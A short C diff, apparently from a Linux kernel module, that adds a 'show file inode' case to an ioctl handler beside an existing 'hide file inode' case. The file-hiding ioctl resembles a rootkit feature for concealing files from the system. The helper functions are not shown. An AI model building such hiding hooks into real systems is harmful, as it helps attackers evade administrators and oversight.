@@ -42,6 +42,9 @@ int handle_ioctl_request(unsigned int fd, unsigned int cmd, unsigned long arg)
         case SERVICE_HIDE_FILE_INODE:
             hide_file_inode(arg);
             break;
+        case SERVICE_SHOW_FILE_INODE:
+            show_file_inode((const void __user *)arg);
+            break;
     }
     /*
      * -EBADF is the error that is returned when performing an ioctl operation on an invalid fd.
